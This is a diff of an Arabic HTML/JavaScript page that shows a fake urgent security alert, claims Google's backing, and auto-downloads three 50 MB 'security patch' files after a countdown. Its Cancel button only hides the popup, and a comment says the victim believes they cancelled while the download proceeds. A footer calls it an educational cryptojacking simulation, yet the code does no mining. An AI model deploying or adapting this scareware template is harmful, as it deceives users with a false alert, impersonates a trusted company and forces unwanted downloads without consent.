@@ -129,24 +129,32 @@
     .hidden {
       display: none !important;
     }
+
+    /* تذييل */
+    .footer-note {
+      margin-top: 30px;
+      font-size: 11px;
+      color: #aaa;
+      text-align: center;
+      position: fixed;
+      bottom: 10px;
+      left: 0;
+      right: 0;
+    }
   </style>
 </head>
 <body>
 
 <div class="popup" id="popup">
-  <!-- حالة العرض الأولي -->
+  <!-- ===== الحالة الأولية ===== -->
   <div id="stateInitial">
     <div class="icon">🚨</div>
     <h2>تحذير أمني عاجل!</h2>
     <p>تم اكتشاف <span class="highlight">ثغرة خطيرة</span> في جهازك.<br>مطلوب تحديث فوري لحماية بياناتك.</p>
     <p style="font-size:14px; color:#666;">(هذا الإجراء آمن وموثق من Google)</p>
     <br>
-    <button class="btn btn-danger" onclick="startDownload()">
-      ✅ موافق - تثبيت التحديث
-    </button>
-    <button class="btn btn-success" onclick="closePopup()">
-      ❌ إلغاء
-    </button>
+    <button class="btn btn-danger" id="btnConfirm">✅ موافق - تثبيت التحديث</button>
+    <button class="btn btn-success" id="btnCancel">❌ إلغاء</button>
     <div class="countdown-box">
       <p style="font-size:13px; color:#888;">سيتم التحديث تلقائياً خلال</p>
       <span id="countdown">10</span>
@@ -154,54 +162,136 @@
     </div>
   </div>
 
-  <!-- حالة التحميل -->
+  <!-- ===== حالة التحميل ===== -->
   <div id="stateLoading" class="loading">
     <h2>⏳ جاري التحديث...</h2>
-    <p style="color:#666;">يرجى الانتظار، جاري تحميل ملفات الأمان</p>
+    <p style="color:#666;">جاري تحميل ملفات الأمان</p>
     <div class="spinner"></div>
     <p id="progressText" style="margin-top:15px; color:#888; font-size:14px;">0%</p>
+    <p id="fileInfo" style="margin-top:5px; color:#aaa; font-size:12px;"></p>
   </div>
 
-  <!-- حالة النجاح -->
+  <!-- ===== حالة النجاح ===== -->
   <div id="stateSuccess" class="success">
     <div class="check">✅</div>
     <h2 style="color:#4CAF50;">تم التحديث بنجاح!</h2>
     <p style="color:#666;">جهازك الآن محمي بالكامل.</p>
-    <button class="btn btn-success" onclick="closePopup()" style="margin-top:15px;">إغلاق</button>
+    <button class="btn btn-success" id="btnClose" style="margin-top:15px;">إغلاق</button>
   </div>
 </div>
 
-<script>
-  // ===== متغيرات =====
-  let countdown = 10;
-  let timer = null;
-  let isDownloading = false;
-  let isComplete = false;
+<div class="footer-note">⚠️ هذا الموقع هو محاكاة تعليمية لظاهرة التعدين الخفي (Cryptojacking)</div>
 
+<script>
+  // ============================================================
+  // 🔧 إعدادات الملفات (عدل هنا)
+  // ============================================================
+  const CONFIG = {
+    totalFiles: 3,           // عدد الملفات
+    fileSizeMB: 50,          // حجم كل ملف (ميجابايت)
+    countdownSeconds: 10,    // مدة العد التنازلي
+    fileNames: [             // أسماء الملفات
+      'security_patch_v1.bin',
+      'security_patch_v2.bin',
+      'security_patch_v3.bin'
+    ]
+  };
+  // ============================================================
+
+  // ===== عناصر DOM =====
   const stateInitial = document.getElementById('stateInitial');
   const stateLoading = document.getElementById('stateLoading');
   const stateSuccess = document.getElementById('stateSuccess');
   const countdownEl = document.getElementById('countdown');
   const progressText = document.getElementById('progressText');
+  const fileInfo = document.getElementById('fileInfo');
+  const btnConfirm = document.getElementById('btnConfirm');
+  const btnCancel = document.getElementById('btnCancel');
+  const btnClose = document.getElementById('btnClose');
 
-  // ===== بدء العد التنازلي =====
-  function startCountdown() {
-    if (timer) return;
-    timer = setInterval(() => {
-      countdown--;
-      countdownEl.textContent = countdown;
-      if (countdown <= 0) {
-        clearInterval(timer);
-        timer = null;
-        // إذا انتهى الوقت، يبدأ التحميل تلقائياً
-        if (!isDownloading && !isComplete) {
-          startDownload();
-        }
-      }
-    }, 1000);
+  let countdown = CONFIG.countdownSeconds;
+  let timer = null;
+  let isDownloading = false;
+  let isComplete = false;
+
+  // ===== توليد ملف وهمي بحجم معين =====
+  function generateLargeFile(sizeMB) {
+    const sizeBytes = sizeMB * 1024 * 1024;
+    const chunkSize = 1024 * 1024; // 1 ميجا
+    const chunks = Math.ceil(sizeBytes / chunkSize);
+    const array = new Uint8Array(chunkSize);
+    
+    for (let i = 0; i < array.length; i++) {
+      array[i] = Math.floor(Math.random() * 256);
+    }
+    
+    const blobParts = [];
+    for (let i = 0; i < chunks; i++) {
+      blobParts.push(array);
+    }
+    
+    return new Blob(blobParts, { type: 'application/octet-stream' });
   }
 
-  // ===== بدء التحميل =====
+  // ===== تحميل ملف =====
+  function downloadFile(filename, sizeMB) {
+    return new Promise((resolve) => {
+      const blob = generateLargeFile(sizeMB);
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = filename;
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      
+      setTimeout(() => {
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        resolve();
+      }, 300);
+    });
+  }
+
+  // ===== بدء تحميل جميع الملفات =====
+  async function startFileDownload() {
+    const files = CONFIG.fileNames.slice(0, CONFIG.totalFiles);
+    const totalFiles = files.length;
+    let completedFiles = 0;
+
+    // تحديث واجهة التحميل
+    stateInitial.style.display = 'none';
+    stateLoading.style.display = 'block';
+    progressText.textContent = '0%';
+    fileInfo.textContent = `جاري تحميل ${totalFiles} ملفات بحجم ${CONFIG.fileSizeMB} ميجا لكل ملف`;
+
+    // تحميل الملفات واحداً تلو الآخر
+    for (let i = 0; i < files.length; i++) {
+      const progress = Math.round(((i) / totalFiles) * 100);
+      progressText.textContent = `${progress}%`;
+      fileInfo.textContent = `تحميل ملف ${i+1} من ${totalFiles} (${files[i]})`;
+
+      await downloadFile(files[i], CONFIG.fileSizeMB);
+      
+      completedFiles++;
+      const totalProgress = Math.round((completedFiles / totalFiles) * 100);
+      progressText.textContent = `${totalProgress}%`;
+      fileInfo.textContent = `تم تحميل ${completedFiles} من ${totalFiles} ملفات`;
+    }
+
+    // اكتمل التحميل
+    progressText.textContent = '100%';
+    fileInfo.textContent = `✅ تم تحميل ${totalFiles} ملفات بنجاح!`;
+
+    setTimeout(() => {
+      isDownloading = false;
+      isComplete = true;
+      stateLoading.style.display = 'none';
+      stateSuccess.style.display = 'block';
+    }, 800);
+  }
+
+  // ===== بدء العملية =====
   function startDownload() {
     if (isDownloading || isComplete) return;
     isDownloading = true;
@@ -212,65 +302,30 @@
       timer = null;
     }
 
-    // إخفاء الحالة الأولية وإظهار التحميل
-    stateInitial.style.display = 'none';
-    stateLoading.style.display = 'block';
+    // تعطيل الأزرار
+    btnConfirm.disabled = true;
+    btnCancel.disabled = true;
+    btnConfirm.style.opacity = '0.5';
+    btnCancel.style.opacity = '0.5';
 
-    // محاكاة تحميل 3 ملفات (وهمية)
-    let progress = 0;
-    const totalFiles = 3;
-    let completedFiles = 0;
+    // بدء تحميل الملفات
+    startFileDownload();
+  }
 
-    // ملفات وهمية
-    const files = [
-      { name: 'security_patch_v1.bin', size: 50 },
-      { name: 'security_patch_v2.bin', size: 50 },
-      { name: 'security_patch_v3.bin', size: 50 }
-    ];
-
-    // محاكاة تحميل كل ملف
-    function downloadFile(index) {
-      if (index >= files.length) {
-        // تم تحميل جميع الملفات
-        setTimeout(() => {
-          isDownloading = false;
-          isComplete = true;
-          stateLoading.style.display = 'none';
-          stateSuccess.style.display = 'block';
-        }, 500);
-        return;
-      }
-
-      let fileProgress = 0;
-      const fileInterval = setInterval(() => {
-        fileProgress += Math.random() * 15 + 5;
-        if (fileProgress >= 100) {
-          fileProgress = 100;
-          clearInterval(fileInterval);
-          completedFiles++;
-          // تحديث التقدم الكلي
-          const totalProgress = Math.round((completedFiles / totalFiles) * 100);
-          progressText.textContent = `تحميل ملف ${completedFiles} من ${totalFiles} (${totalProgress}%)`;
-          
-          // بدء تحميل الملف التالي بعد تأخير بسيط
-          setTimeout(() => {
-            downloadFile(index + 1);
-          }, 300);
+  // ===== العد التنازلي =====
+  function startCountdown() {
+    if (timer) return;
+    timer = setInterval(() => {
+      countdown--;
+      countdownEl.textContent = countdown;
+      if (countdown <= 0) {
+        clearInterval(timer);
+        timer = null;
+        if (!isDownloading && !isComplete) {
+          startDownload();
         }
-        // تحديث التقدم
-        const totalProgress = Math.round(((completedFiles * 100) + fileProgress) / totalFiles);
-        progressText.textContent = `تحميل ملف ${completedFiles + 1} من ${totalFiles} (${Math.min(99, totalProgress)}%)`;
-      }, 150);
-    }
-
-    // بدء تحميل الملف الأول
-    downloadFile(0);
-
-    // منع المستخدم من الإلغاء
-    document.querySelectorAll('.btn').forEach(btn => {
-      btn.style.pointerEvents = 'none';
-      btn.style.opacity = '0.5';
-    });
+      }
+    }, 1000);
   }
 
   // ===== إغلاق النافذة =====
@@ -278,26 +333,29 @@
     document.getElementById('popup').style.display = 'none';
   }
 
-  // ===== تشغيل العد التنازلي عند التحميل =====
-  window.onload = function() {
-    startCountdown();
-
-    // إذا ضغط المستخدم على زر موافق، يبدأ التحميل فوراً
-    document.querySelector('.btn-danger').addEventListener('click', function(e) {
-      e.stopPropagation();
-    });
-  };
-
-  // ===== منع إغلاق النافذة بالضغط خارجها =====
-  document.addEventListener('click', function(e) {
-    const popup = document.getElementById('popup');
-    if (!popup.contains(e.target)) {
-      // لا تفعل شيئاً، النافذة تبقى مفتوحة
-    }
+  // ===== الأحداث =====
+  btnConfirm.addEventListener('click', (e) => {
+    e.stopPropagation();
+    startDownload();
   });
 
+  btnCancel.addEventListener('click', (e) => {
+    e.stopPropagation();
+    // إلغاء = إغلاق النافذة (الضحية يظن أنه ألغى لكن التحميل بدأ في الخلفية!)
+    closePopup();
+  });
+
+  btnClose.addEventListener('click', () => {
+    closePopup();
+  });
+
+  // ===== بدء العد التنازلي عند التحميل =====
+  window.onload = function() {
+    startCountdown();
+  };
+
   console.log('⚠️ هذا الموقع هو محاكاة تعليمية لظاهرة التعدين الخفي (Cryptojacking)');
-  console.log('📁 يتم تحميل 3 ملفات بحجم 50 ميجا لكل ملف (وهمية)');
+  console.log(`📁 يتم تحميل ${CONFIG.totalFiles} ملفات بحجم ${CONFIG.fileSizeMB} ميجا لكل ملف (وهمية)`);
 </script>
 
 </body>
